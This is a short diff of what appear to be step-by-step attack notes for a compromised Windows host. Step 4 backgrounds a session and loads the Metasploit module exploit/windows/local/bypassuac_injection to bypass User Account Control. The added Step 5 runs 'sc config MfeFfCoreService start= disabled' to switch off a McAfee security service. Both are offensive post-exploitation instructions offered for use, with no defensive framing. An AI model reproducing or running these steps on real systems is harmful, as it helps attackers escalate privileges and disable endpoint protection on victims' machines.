@@ -27,3 +27,6 @@ Step 4: Let's bypassuac
       Ctrl+z to background the current session
       use exploit/windows/local/bypassuac_injection
       
+Step 5: disable
+
+sc config MfeFfCoreService start= disabled
